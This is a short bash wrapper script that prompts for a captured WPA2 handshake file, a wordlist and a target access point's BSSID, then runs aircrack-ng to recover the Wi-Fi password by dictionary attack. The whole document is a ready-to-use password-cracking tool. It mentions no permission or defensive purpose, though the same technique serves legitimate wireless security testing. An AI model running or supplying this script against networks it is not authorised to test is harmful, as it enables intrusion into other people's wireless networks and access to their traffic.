#!/bin/bash 

# Ask the user for the handshake file, wordlist, and BSSID
read -p "Enter the path to the handshake capture file (.cap): " handshake_file 
read -p "Enter the path to the wordlist file: " wordlist_file
read -p "Enter the target BSSID (MAC address of the AP): " bssid

# Check if files exist
if [[ ! -f "$handshake_file" ]]; then
    echo "Error: Handshake file not found!"
    exit 1
fi 

if [[ ! -f "$wordlist_file" ]]; then 
    echo "Error: Wordlist file not found!"
    exit 1
fi

# Start cracking with aircrack-ng
echo "Starting WPA2 handshake cracking..."
aircrack-ng -w "$wordlist_file" -b "$bssid" "$handshake_file"